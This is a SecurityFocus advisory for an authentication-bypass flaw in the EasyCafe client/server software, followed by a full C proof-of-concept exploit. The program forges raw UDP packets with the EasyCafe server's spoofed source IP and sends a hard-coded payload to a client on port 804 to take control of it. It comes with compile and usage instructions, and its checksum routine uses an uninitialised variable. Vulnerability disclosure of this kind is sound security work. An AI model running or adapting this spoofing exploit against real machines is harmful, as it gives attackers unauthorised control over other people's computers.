source: http://www.securityfocus.com/bid/19401/info

EasyCafe is prone to a vulnerability that lets attackers bypass security restrictions.

This issue occurs because the application fails to prevent an attacker from gaining unauthorized access to a client computer. 

An attacker can exploit this issue to gain unauthorized access to the client's computer. Other attacks are also possible. 

Version 2.1.7 to 2.2.14 are vulnerable to this issue; other versions may also be affected.

/*EasyPOC.c--EasyCafe Security Restriction Bypass Vulnerability


 � About this POC :
 �  This Proof of concept is for one of TinaSoft EasyCafe Vulnerabilities.
 �  poor authentication in this Client/Server software enables an attacker 
 �  to control other computers by sending spoofed packets.
 
 � Compile info :
 �  Use VC++ to compile this code and don't forget adding Ws2_32.lib to your 
 �  Project.
 
 � Author :
 �  Coded by Mobin Yazarlou. Secure_KrnlREMOVE-THIS �atsign� Yahoo �dot� com

*/
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib,"Ws2_32.lib")
unsigned short int ip_checksum(char *,int);

 struct ipheader
 {
  char ver_len;
  char tos;
  unsigned short int packet_len;
  unsigned short int id;
  unsigned short int flags;
  char ttl;
  char protocol;
  unsigned short int checksum;
  unsigned int srcaddr;
  unsigned int destaddr;
 };

 struct udpheader
 {
  unsigned short int src_port;
  unsigned short int dest_port;
  unsigned short int length;
  unsigned short int checksum;
 };

 main(int argc,char **argv)
 {
  unsigned int packetsize,optlen = sizeof(BOOL);
  BOOL optval = TRUE;
  unsigned char payload[]="\xFE\x00\x00\x00\x00\x00\x00\x00\x5C\xE9\x00\x00\x01"
                          "\x00\x00\x00\x3C\xFB\x12\x00\x63\x6D\xE1\x77\x46\x02"
                          "\x02\x00\x12\x02\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                          "\x00\x01\x00\x00\x00\xB2\xC1\x46\x00\x46\x02\x02\x00"
                          "\x12\x02\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x44"
                          "\xFB\x12\x00\xCA\xC1\x46\x00\xD2\xC1\x46\x00\xEC\x00"
                          "\x00\x00\x47\x01\x00\x00\xA4\x84\x77\x01\x00\x00\x00"
                          "\x00\x60\xFB\x12\x00\xA6\xB5\x45\x00\x14\x00\x00\x00"
                          "\x61\xF1\x41\x00\x80\x0B\x70\x01\x99\x00\x43\x00\xA1"
                          "\x00\x43\x00\x47\x01\x00\x00\xA0\x0B\x70\x01\xEF\xB2"
                          "\x45\x00\x60\xFB\x12\x00\x06\xB3\x45\x00\x0E\xB3\x45"
                          "\x00\x24\xFE\x12\x00\x18\xB3\x45\x00\x60\xFB\x12\x00"
                          "\xEC\x00\x00\x00\x47\x01\x00\x00\xA4\x84\x77\x01\x5C"
                          "\x04\x72\x01\x78\xFB\x12\x00\xDA\x8B\x42\x00\x84\x00"
                          "\x00\x00\x00\x00\x00\x00\x5E\x01\xD5\x01\x01\x00\x00"
                          "\x00\x98\xFB\x12\x00\xA8\x2C\xE1\x77\xE0\x02\x01\x00"
                          "\x84\x00\x00\x00\x00\x00\x00\x00\x5E\x01\xD5\x01\x47"
                          "\x01\x00\x00\xCD\xAB\xBA\xDC\xB4\xFB\x12\x00\x64\x47"
                          "\xE1\x77\x53\x0F\x80\x01\xE0\x02\x01\x00\x84\x00\x00"
                          "\x00\x00\x00\x00\x00\x5E\x01\xD5\x01\xDC\xFB\x12\x00"
                          "\x20\x47\xE1\x77\x90\x31\x8F\x00\x84\x00\x00\x00\x00"
                          "\x00\x00\x00\x30\x47\xE1\x77\x00\x00\x00\x00\x01\x00"
                          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xFC\x12"
                          "\x00\xEF\x15\xFA\x77\xEC\xFB\x12\x00\x18\x00\x00\x00"
                          "\x90\x31\x8F\x00\x84\x00\x00\x00\x00\x00\x00\x00\x5E"
                          "\x01\xD5\x01\x53\x0F\x80\x01\x35\x47\xE1\x77\xC0\xD5"
                          "\xE2\x77\xB5\x02\x0E\x00\x2E\x49\x20\x61\x6D\x20\x20"
                          "\x61\x20\x56\x75\x6C\x6E\x65\x72\x61\x62\x6C\x65\x20"
                          "\x76\x65\x72\x73\x69\x6F\x6E\x20\x6F\x66\x20\x45\x61"
                          "\x73\x79\x43\x61\x66\x65\x20\x43\x6C\x69\x65\x6E\x74"
                          "\x21\x00\x46\x02\x02\x00\x00\x00\x00\x00\x47\x01\x00"
                          "\x00\xEC\x00\x00\x00\x74\xFC\x12\x00\x88\x71\x70\x01"
                          "\xB4\xAF\x7E\x01\x68\x6E\x46\x00\x68\x01\x65\x00\x54"
                          "\xBD\x72\x01\xBC\x87\x45\x00\x54\xBD\x72\x01\x47\x01"
                          "\x00\x00\xEC\x00\x00\x00\x90\xFC\x12\x00\xEC\x87\x45"
                          "\x00\x3A\x00\x00\x00\x44\x00\x00\x00\x10\x00\x00\x00"
                          "\x01\x00\x00\x00\x10\x00\x00\x10\xB4\xFC\x12\x00\x6F"
                          "\x88\x45\x00\x3A\x00\x00\x00\x44\x00\x00\x00\x04\x02"
                          "\x00\x00\x54\xFE\x12\x00\x54\xBD\x72\x01\xEC\xFD\x12"
                          "\x00\x04\x02\x00\x00\xEC\xFD\x12\x00\xF4\x89\x45\x00"
                          "\x00\x02\x00\x00\x54\xBD\x72\x01\x54\xFE\x12\x00\xFF"
                          "\x85\x45\x00\x04\x02\x00\x00\x54\xFE\x12\x00\x54\xBD"
                          "\x72\x01\xFF\x85\x45\x00\x3C\xFF\x12\x00\x54\xFE\x12"
                          "\x00\xF0\x84\x72\x01\xEA\x04\xE2\x77\xA8\x3A\x8F\x00"
                          "\x0F\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20"
                          "\x81\xF7\x77\xAA\xAE\x46\x00\x01\x00\x00\x00\x01\x00"
                          "\x00\x00\x5C\xD4\x77\x01\xD0\xFD\x12\x00\x30\xFD\x12"
                          "\x00\xC6\xAE\x46\x00\xAA\xAE\x46\x00\x02\x00\x00\x00"
                          "\x01\x00\x00\x00\x3C\x0C\x77\x01\xD0\xFD\x12\x00\x06"
                          "\x32\x2E\x32\x2E\x31\x34\x00\xAA\xAE\x46\x00\x0A\x00"
                          "\x00\x00\x01\x00\x00\x00\x44\xF1\x77\x01\xD0\xFD\x12"
                          "\x00\x68\xFD\x12\x00\xC6\xAE\x46\x00\xAA\xAE\x46\x00"
                          "\x00\x00\x00\x00\x18\x8C\x77\x01\xA4\xFD\x12\x00\x48"
                          "\xAE\x46\x01\x88\xFD\x12\x00\x5E\x76\x46\x00\xD0\xFD"
                          "\x12\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                          "\x01\x48\xAE\x46\x00\x30\x04\x78\x01\xB8\xFD\x12\x00"
                          "\x29\x77\x46\x00\xB8\xFD\x12\x00\x00\x00\x00\x00\x54"
                          "\xFE\x12\x00\x00\x00\x00\x00\xE8\xFD\x01\x00\x0D\x00"
                          "\x00\x00\x00\x00\x00\x00\x18\x8C\x77\x01\x48\xAE\x46"
                          "\x00\x00\x00\x00\x00\xD0\xFD\x12\x00";

  unsigned char *packet;
  SOCKET easypoc;
  WSADATA wsdata;
  struct ipheader *iphead;
  struct udpheader *udphead;
  struct sockaddr_in remote;

   if(argc != 3)
   {
	printf("\n <>EasyCafe Security Restriction Bypass Vulnerability POC\n   Coded By Mobin Yazarlou\n\n");
	printf(" Usage :\n  EasyPOC <EasyCafe Server IP> <EasyCafe Client IP>\n");
    exit(0);
   }

   if(WSAStartup(MAKEWORD(2,0),&wsdata) != 0)
   {
	printf("Windows Socket API Startup Failure.\n");
    exit(-1);
   }

   easypoc = socket(AF_INET,SOCK_RAW,IPPROTO_UDP);

   if(setsockopt(easypoc,IPPROTO_IP,IP_HDRINCL,(char *) &optval,optlen) == SOCKET_ERROR)
	printf("Could not set IP_HDRINCL option.Error Num. %d\n",WSAGetLastError());

   remote.sin_family = AF_INET;
   remote.sin_addr.s_addr = inet_addr(argv[2]);
   remote.sin_port = htons(804);

   packetsize = sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(payload) - 1;
   packet = (unsigned char *) malloc(packetsize);
   memset(packet,0,packetsize);

   iphead = (struct ipheader *) packet;
   iphead->ver_len = (4 << 4) | 5;
   iphead->tos = 0;
   iphead->packet_len = htons(packetsize);
   iphead->id = 0;
   iphead->flags = 0;
   iphead->ttl = 128;
   iphead->protocol = 0x11;
   iphead->checksum = 0;
   iphead->srcaddr = inet_addr(argv[1]);
   iphead->destaddr = remote.sin_addr.s_addr;
   iphead->checksum = ip_checksum(packet,sizeof(struct ipheader));

   udphead = (struct udpheader *) (packet + sizeof(struct ipheader));
   udphead->src_port = htons(800);
   udphead->dest_port = htons(804);
   udphead->length = htons(sizeof(struct udpheader) + sizeof(payload) - 1);
   udphead->checksum = 0;

   memcpy(packet + sizeof(struct ipheader) + sizeof(struct udpheader),payload,sizeof(payload)-1);
   
   if(sendto(easypoc,packet,packetsize,0,(struct sockaddr *) &remote,sizeof(struct sockaddr)) == SOCKET_ERROR)
   {
	printf("SendTo Function Failed.Error Num. %d\n",WSAGetLastError());
	if(WSAGetLastError() == 10004)
	 printf("Local OS Denied IP Spoofing.\n");
   }
   else
    printf("Message Sent!\nPlease Check out the Client.\n");

   closesocket(easypoc);
   WSACleanup();
 }

 unsigned short int ip_checksum(char *buff,int bytes)
 {
  unsigned int i;
  unsigned long checksum;

   for(i=0; i<bytes ;i+=2)
    checksum += * (unsigned short int *) &buff[i];

   checksum = (checksum >> 16) + (checksum & 0xffff);
   checksum += checksum >> 16;
   checksum = ~checksum;

  return checksum;
 }


